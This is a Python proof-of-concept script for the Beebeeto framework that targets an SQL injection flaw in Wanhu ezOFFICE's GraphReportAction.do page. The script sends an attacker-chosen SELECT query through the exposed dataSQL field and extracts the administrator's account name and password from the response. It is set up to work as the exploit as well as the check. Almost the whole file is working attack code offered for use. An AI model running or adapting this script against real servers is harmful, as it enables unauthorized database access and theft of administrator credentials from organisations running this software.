#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2,urllib

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0030',  # 由Beebeeto官方编辑
            'name': 'Wanhu-ezOFFICE /defaultroot/GraphReportAction.do SQL注射漏洞 POC',  # 名称
            'author': 'W_HHH',  # 作者
            'create_date': '2014-09-25',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wanhu-ezOFFICE',  # 漏洞所涉及的应用名称
            'vul_version': ['*'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['Wanhu', 'Wanhu-ezOFFICE'],  # 漏洞相关tag
            'desc': 'Wanhu-ezOFFICE  /defaultroot/GraphReportAction.do SQL注射漏洞。',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-064324/',  # 参考链接
            ],
        },
    }

    @staticmethod
    def post(url, data):
        req = urllib2.Request(url)
        data = urllib.urlencode(data)
        #enable cookie
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        response = opener.open(req, data)
        return response.read()

    @classmethod
    def verify(cls, args):
        file_path = "/defaultroot/GraphReportAction.do?action=showResult"
        verify_url = args['options']['target'] + file_path
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url

        reinfo = '<textarea name="dataSQL" rows="5" style="width:100%" readonly></textarea>'
        response = urllib2.urlopen(verify_url).read()
        match_hash = re.compile(reinfo)
        form_hash = match_hash.findall(response)
        if not form_hash:
            args['success'] = False
            return args

        # execution sql
        payload = {'dataSQL' : 'select USERACCOUNTS,USERPASSWORD from org_employee where EMP_ID=0'}
        response = cls.post(verify_url, payload)
        match_hash = re.compile('<td class="listTableLine2">.*?</td>')
        form_hash = match_hash.findall(response)
        if len(form_hash) != 2:
            args['success'] = False
            return args

        # get admin user and password
        args['success'] = True
        args['poc_ret']['Admin-username'] = form_hash[0][form_hash[0].find('">') + 2:].rstrip('</td>')
        args['poc_ret']['Admin-password'] = form_hash[1][form_hash[0].find('">') + 2:].rstrip('</td>')

        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
